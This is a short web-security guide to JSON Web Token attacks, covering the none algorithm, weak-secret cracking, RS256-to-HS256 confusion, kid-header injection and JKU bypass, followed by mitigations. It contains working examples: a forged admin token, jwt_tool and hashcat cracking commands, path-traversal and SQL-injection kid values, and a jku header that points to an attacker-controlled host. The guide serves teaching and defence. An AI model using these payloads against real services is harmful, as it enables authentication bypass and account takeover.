📌 JWT Attacks – Complete Guide

JSON Web Token vulnerabilities: none algorithm, weak secrets, algorithm confusion, kid injection, and JKU bypass.

Jump to section:

  • None Algorithm
  • Weak Secret
  • Algorithm Confusion
  • Kid Injection
  • JKU Bypass

1. None Algorithm Attack

What it is: JWT allows the alg: none header for debugging. If the server accepts it, the signature is not verified. Attackers can forge any token.

Why it occurs: Misconfigured JWT library that does not reject the none algorithm.

# Original token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9.signature

# Forged token (alg: none, empty signature)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.

Detection: Decode token, change alg to none, remove signature, send to protected endpoint. If accepted, vulnerable.

2. Weak Secret / Brute Force

What it is: HS256 uses a shared secret. If the secret is weak (e.g., "secret", "password", short strings), attackers can crack it offline.

# Using jwt_tool
python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat (mode 16500)
hashcat -a 0 -m 16500 JWT_TOKEN rockyou.txt

3. Algorithm Confusion (RS256 to HS256)

What it is: The server expects RS256 (asymmetric) but also accepts HS256 (symmetric). Attackers can use the public key as the HMAC secret to sign a forged token.

# Obtain public key (often from /jwks.json or /certs)
# Forge token with HS256 using the public key as secret
python3 jwt_tool.py JWT_TOKEN -S hs256 -k public.pem

4. Kid Injection (Path Traversal / SQLi)

What it is: The kid (Key ID) header is used to retrieve the verification key from a filesystem or database. If not sanitised, an attacker can inject ../ to read arbitrary files or inject SQL to manipulate key lookup.

# Path traversal in kid
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../dev/null"
}

# SQL injection in kid (if database lookup)
{
  "alg": "HS256",
  "kid": "' UNION SELECT 'known_secret' --"
}

5. JKU (JWKS URL) Bypass

What it is: The jku header points to a URL containing the public key. If the server fetches from that URL without validation, an attacker can host a malicious JWKS with their own public key and sign arbitrary tokens.

# Header
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/malicious-jwks.json"
}

🛡️ Mitigation (All JWT Attacks)

✅ Reject alg: none – always verify signature
✅ Use strong, random secrets (≥ 32 bytes, generated with openssl rand -base64 32)
✅ Whitelist allowed algorithms (only HS256/RS256/ES256, never none)
✅ Do not accept jku or restrict to trusted URLs
✅ Validate and sanitise kid – avoid filesystem/database injection
✅ Use asymmetric algorithms (RS256/ES256) to avoid secret sharing
✅ Regularly rotate keys
